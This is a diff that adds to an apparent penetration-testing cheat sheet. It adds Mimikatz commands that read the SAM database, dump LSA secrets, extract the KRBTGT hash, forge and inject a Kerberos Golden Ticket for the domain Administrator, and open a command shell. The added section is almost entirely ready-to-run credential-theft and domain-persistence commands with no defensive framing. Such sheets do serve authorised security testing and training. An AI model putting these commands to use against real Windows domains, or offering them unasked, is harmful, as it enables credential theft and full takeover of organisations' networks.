@@ -921,6 +921,28 @@ Read lsass.exe
 ```
 sekurlsa::logonpasswords
 ```
+Read SAM
+```
+lsadump::sam
+```
+Dump LSA
+```
+lsadump::lsa /patch
+```
+### Golden Ticket
+
+Dump KRBTGT info (get Domain SID and NTLM Primary hash)
+```
+lsadump::lsa /inject /name:krbtgt
+```
+Create the GT
+```
+kerberos::golden /User:Administrator /domain:domain.local /sid:SID /krbtgt:NTLM_HASH /id:500 (Admin ID) /ptt
+```
+Launch cmd.exe
+```
+misc::cmd
+```
 
 
 ## Privilege Escalation
